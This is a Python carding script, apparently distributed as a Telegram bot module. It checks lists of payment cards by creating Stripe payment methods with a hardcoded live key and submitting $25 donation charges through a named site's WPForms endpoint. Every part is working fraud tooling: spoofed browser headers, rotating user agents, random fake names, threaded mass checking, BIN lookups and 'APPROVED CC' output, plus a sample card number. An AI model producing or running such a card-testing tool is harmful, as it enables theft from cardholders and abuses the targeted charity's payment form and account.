import requests
import os
import re
import random
import string
import time
import json
import uuid
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
import threading

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
STRIPE_KEY = "pk_live_51NdxjPD4CaMGpg6VjNWdfgA0dLCD7u0okjERkjbA2OlqNeDceQzHScZhNSCyDWxyg3OjS3ZhdCT8z42eEYgrmw4z00OvQCdAKO"
BASE_URL = "https://heybenji.org"
EMAIL = "hellomohitv2@tiffincrane.com"

def get_rotating_user_agent():
    desktop_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0'
    ]
    return random.choice(desktop_agents)

def parse_proxy(proxy_str):
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            auth_part, server_part = proxy_str.split('@', 1)
            username, password = auth_part.split(':', 1)
            ip, port = server_part.split(':', 1)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
            elif len(parts) == 2:
                ip, port = parts
                username, password = None, None
            else:
                ip, port = parts[0], parts[1]
                username, password = None, None
        
        if username and password:
            proxy_url = f'http://{username}:{password}@{ip}:{port}'
        else:
            proxy_url = f'http://{ip}:{port}'
        
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def setup_session(proxy_str=None):
    r = requests.Session()
    
    # Setup retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504, 429],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    r.mount("https://", adapter)
    r.mount("http://", adapter)
    
    # Set proxies if provided (but we won't use proxies as per user request)
    # if proxy_str:
    #     proxies = parse_proxy(proxy_str)
    #     if proxies:
    #         r.proxies.update(proxies)
    
    return r

def get_bin_info(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                if 'binlist.net' in api_url:
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except:
            continue
    
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': ''
    }

def get_country_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def generate_stripe_metadata():
    """Generate Stripe metadata like guid, muid, sid"""
    return {
        'guid': str(uuid.uuid4()).replace('-', '') + str(uuid.uuid4()).replace('-', '')[:16],
        'muid': str(uuid.uuid4()).replace('-', '') + str(uuid.uuid4()).replace('-', '')[:16],
        'sid': str(uuid.uuid4()).replace('-', '') + str(uuid.uuid4()).replace('-', '')[:16]
    }

def check_card_st25(cc_line):
    start_time = time.time()
    max_retries = 2
    
    for attempt in range(max_retries):
        try:
            # Parse card details
            if '|' in cc_line:
                parts = cc_line.strip().split('|')
                if len(parts) >= 4:
                    n = parts[0].strip().replace(' ', '').replace('+', '')
                    mm = parts[1].strip()
                    yy = parts[2].strip()
                    cvc = parts[3].strip()
                else:
                    elapsed_time = time.time() - start_time
                    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Format month and year
            if len(mm) == 1:
                mm = f'0{mm}'
            if len(yy) == 4:
                yy = yy[2:]
            
            # Get BIN info
            bin_info = get_bin_info(n[:6])
            
            # Setup session without proxy (separate session for each card)
            r = setup_session(None)
            user_agent = get_rotating_user_agent()
            
            # Generate Stripe metadata for this session
            stripe_meta = generate_stripe_metadata()
            
            # Step 1: Create payment method using Stripe API
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': user_agent,
            }
            
            # Prepare form data for payment method creation
            from urllib.parse import urlencode, quote_plus
            
            # Format card number with + instead of spaces (as in original request)
            card_number_formatted = n.replace(' ', '+')
            
            # Build form data dictionary
            data = {
                'type': 'card',
                'card[number]': card_number_formatted,
                'card[cvc]': cvc,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'ZW',
                'billing_details[email]': EMAIL,
                'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent; autopm',
                'referrer': BASE_URL,
                'time_on_page': str(random.randint(20000, 30000)),
                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
                'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'client_attribution_metadata[merchant_integration_additional_elements][1]': 'linkAuthentication',
                'guid': stripe_meta['guid'],
                'muid': stripe_meta['muid'],
                'sid': stripe_meta['sid'],
                'key': STRIPE_KEY,
            }
            
            # Use requests' built-in form encoding
            response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30, verify=False)
            
            if response.status_code != 200:
                elapsed_time = time.time() - start_time
                error_msg = "Payment method creation failed"
                try:
                    error_data = response.json()
                    if 'error' in error_data:
                        error_msg = error_data['error'].get('message', error_msg)
                except:
                    pass
                
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Extract payment method ID
            try:
                payment_method_data = response.json()
                if 'id' not in payment_method_data:
                    elapsed_time = time.time() - start_time
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment method ID not found ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                payment_method_id = payment_method_data['id']
            except Exception as e:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Error parsing payment method response ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Step 2: Submit payment form
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryAIuheMfs6Pojbuyh',
                'origin': BASE_URL,
                'priority': 'u=1, i',
                'referer': f'{BASE_URL}/stripe-payment/',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': user_agent,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            # Generate random name
            first_name = random.choice(['Sam', 'John', 'Mike', 'David', 'Chris', 'Alex', 'James', 'Tom'])
            last_name = random.choice(['Jones', 'Smith', 'Brown', 'Wilson', 'Taylor', 'Anderson', 'Thomas', 'Jackson'])
            
            # Prepare multipart form data
            files = {
                'wpforms[fields][0][first]': (None, first_name),
                'wpforms[fields][0][last]': (None, last_name),
                'wpforms[fields][1]': (None, EMAIL),
                'wpforms[fields][3]': (None, '5'),
                'wpforms[fields][4]': (None, '$25.00'),
                'wpforms[id]': (None, '1236'),
                'page_title': (None, 'stripe payment'),
                'page_url': (None, f'{BASE_URL}/stripe-payment/'),
                'url_referer': (None, ''),
                'page_id': (None, '1238'),
                'wpforms[post_id]': (None, '1238'),
                'wpforms[payment_method_id]': (None, payment_method_id),
                'wpforms[token]': (None, ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))),
                'action': (None, 'wpforms_submit'),
                'start_timestamp': (None, str(int(time.time()))),
                'end_timestamp': (None, str(int(time.time()) + random.randint(20, 40))),
            }
            
            response = r.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, files=files, timeout=30, verify=False)
            
            elapsed_time = time.time() - start_time
            
            # Check response for success
            try:
                response_json = response.json()
                success = False
                response_message = "Payment failed"
                
                # Check various success indicators
                if response.status_code == 200:
                    # Check for success in response
                    if isinstance(response_json, dict):
                        if response_json.get('success') == True:
                            success = True
                            response_message = "Charged $25.00 ✅"
                        elif 'data' in response_json:
                            if isinstance(response_json['data'], dict):
                                if response_json['data'].get('success') == True:
                                    success = True
                                    response_message = "Charged $25.00 ✅"
                    elif isinstance(response_json, str):
                        if 'success' in response_json.lower() or 'approved' in response_json.lower():
                            success = True
                            response_message = "Charged $25.00 ✅"
                
                # Also check response text for success indicators
                response_text = response.text.lower()
                if 'success' in response_text or 'approved' in response_text or 'payment' in response_text:
                    if 'error' not in response_text and 'decline' not in response_text and 'fail' not in response_text:
                        success = True
                        response_message = "Charged $25.00 ✅"
                
                if success:
                    status = "APPROVED CC ✅"
                    response_emoji = "✅"
                else:
                    status = "DECLINED CC ❌"
                    response_emoji = "❌"
                    # Try to extract error message
                    if isinstance(response_json, dict):
                        if 'data' in response_json and isinstance(response_json['data'], dict):
                            if 'message' in response_json['data']:
                                response_message = response_json['data']['message']
                        elif 'message' in response_json:
                            response_message = response_json['message']
                
            except Exception as e:
                # If JSON parsing fails, check status code
                if response.status_code == 200:
                    status = "APPROVED CC ✅"
                    response_emoji = "✅"
                    response_message = "Charged $25.00 ✅"
                else:
                    status = "DECLINED CC ❌"
                    response_emoji = "❌"
                    response_message = f"Payment failed (Status: {response.status_code})"
            
            return f"""
{status}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message} {response_emoji}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError):
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error after {max_retries} retries
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    # This return statement is outside the for loop
    elapsed_time = time.time() - start_time
    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Max retries exceeded
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 25$ Charge Donation

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_st25(cc_lines):
    """Mass check function for multiple cards with threading"""
    results = []
    lock = threading.Lock()
    
    def process_card(cc_line):
        result = check_card_st25(cc_line)
        with lock:
            results.append(result)
        time.sleep(0.5)  # Small delay between checks
    
    threads = []
    for cc_line in cc_lines:
        thread = threading.Thread(target=process_card, args=(cc_line,))
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    return results

if __name__ == "__main__":
    # Test single card
    test_card = "4447962663646762|08|29|616"
    result = check_card_st25(test_card)
    print(result)

